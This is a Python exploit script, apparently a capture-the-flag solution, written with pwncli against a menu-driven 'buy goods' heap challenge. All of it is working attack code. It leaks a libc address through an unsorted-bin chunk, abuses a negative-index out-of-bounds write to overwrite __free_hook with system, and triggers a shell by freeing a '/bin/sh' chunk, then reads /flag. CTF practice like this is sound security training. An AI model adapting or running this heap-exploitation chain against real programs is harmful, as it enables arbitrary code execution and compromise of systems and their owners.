#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(data="a\n"):
    p.sendlineafter("EMMmmm, you will be a rich man!\n", "1")
    p.sendafter("I will give you $9999, but what's the  currency type you want, RMB or Dollar?\n", data)

def over():
    p.sendlineafter("EMMmmm, you will be a rich man!\n", "3")

def buy(length:int, data="a\n"):
    p.sendlineafter("Now, buy buy buy!\n", "1")
    p.sendlineafter("How long is your goods name?\n", str(length))
    if length != 0:
        p.sendafter("What is your goods name?\n", data)

def delete(idx:int):
    p.sendlineafter("Now, buy buy buy!\n", "2")
    p.sendlineafter("Which goods that you don't need?\n", str(idx))

def modify(idx:int, data="a\n"):
    p.sendlineafter("Now, buy buy buy!\n", "3")
    p.sendlineafter("Which goods you need to modify?\n", str(idx))
    p.recvuntil("OK, what would you like to modify ")
    msg = p.recvline()
    p.send(data)
    info("msg recv: {}".format(msg))
    return msg

def exp():
    for i in range(20):
        add("a" * 7)
    
    over()

    buy(0x500) # 0
    buy(0x10, "/bin/sh\x00\n") # 1

    # get unsorted bin
    delete(0)
    buy(0) # 2
    
    # leak libc addr
    msg = modify(2)
    libc_base_addr = u64(msg[:6].ljust(8, b"\x00")) - 0x3ec0d0
    log_address("libc_base_addr", libc_base_addr)

    # find the memory stores __free_hook address
    # use overflow index to change __free_hook's content to system
    modify(-2, p64(libc_base_addr + 0x3eaee8)[:7])
    modify(-22, p64(libc_base_addr + libc.sym['system'])[:7])

    # get shell
    delete(1)

    p.sendline("cat /flag")
    p.interactive()

exp()